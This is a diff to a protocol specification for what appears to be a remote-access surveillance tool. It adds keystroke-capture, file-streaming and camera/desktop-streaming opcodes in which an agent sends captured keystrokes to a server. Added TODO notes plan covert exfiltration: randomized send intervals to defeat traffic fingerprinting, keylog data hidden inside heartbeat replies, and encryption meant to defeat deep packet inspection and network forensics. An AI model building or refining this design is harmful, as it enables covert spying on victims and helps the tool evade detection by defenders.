@@ -29,11 +29,12 @@ struct PacketHeader {
 - `0x0007` : PROC_LIST_RES — Paged Process List Response (Client -> Server)
 
 ### Surveillance (Gourmandise)
-- `0x0100` : Start Keylogger (Server -> Client)
-- `0x0101` : Stop Keylogger (Server -> Client)
-- `0x0102` : Keylogger Buffer Dump (Client -> Server)
-- `0x0103` : Start/Stop File Stream (Server <-> Client)
-- `0x0104` : Start/Stop Camera/Desktop Event Stream (Server <-> Client)
+- `0x0100` : KEYLOG_START — Begin keystroke capture (Server -> Agent)
+- `0x0101` : KEYLOG_STOP — Halt keystroke capture (Server -> Agent)
+- `0x0102` : KEYLOG_DUMP — Request buffer flush (Server -> Agent)
+- `0x0103` : STREAM_FILE — Start/Stop File Stream (Server <-> Agent)
+- `0x0104` : STREAM_CAMERA — Start/Stop Camera/Desktop Event Stream (Server <-> Agent)
+- `0x0108` : KEYLOG_DATA — Keystroke buffer payload (Agent -> Server, response to KEYLOG_DUMP)
 
 ## 4. Data Structures
 
@@ -88,6 +89,18 @@ Sent by the Agent to the Server, carrying chunked command output.
 > **TODO Circle 8 (Ruse et Tromperie):** Wrap all packet payloads in symmetric encryption
 > (e.g. AES-256-GCM) to defeat DPI content inspection and prevent payload reconstruction
 > by network forensics tools.
+
+> **TODO Circle 8 (Ruse et Tromperie) — Keylogger Stealth Streaming Evolution:**
+> Replace the current Buffer + Dump model with a full stealth streaming architecture:
+> - **Jitter thread**: A dedicated dispatcher thread reads from the keystroke event queue
+>   and sleeps for a randomized interval (500ms–3000ms) before emitting each batch.
+>   This breaks timing-based traffic fingerprinting by mimicking human-driven app behaviour.
+> - **PONG piggybacking**: Embed `KEYLOG_DATA` payloads inside `PONG` response packets
+>   instead of using a dedicated opcode, so no `KEYLOG_DATA` packet ever appears in a
+>   network capture — the agent appears to only respond to heartbeats.
+> - **AES-256-GCM encryption**: All payloads encrypted end-to-end. Combined with jitter
+>   and piggybacking, the traffic is mathematically indistinguishable from TLS at any
+>   inspection layer. See the Circle 8 multi-thread agent architecture in DEV-LOG.md.
 
 ## 5. Endianness
 All multi-byte integers (`uint16_t`, `uint32_t`) MUST be transmitted in Network Byte Order (Big-Endian). Implementations MUST use explicit bit-shifting serialization (not `htonl`/`htons` combined with pointer casting, which is not portable across architectures).
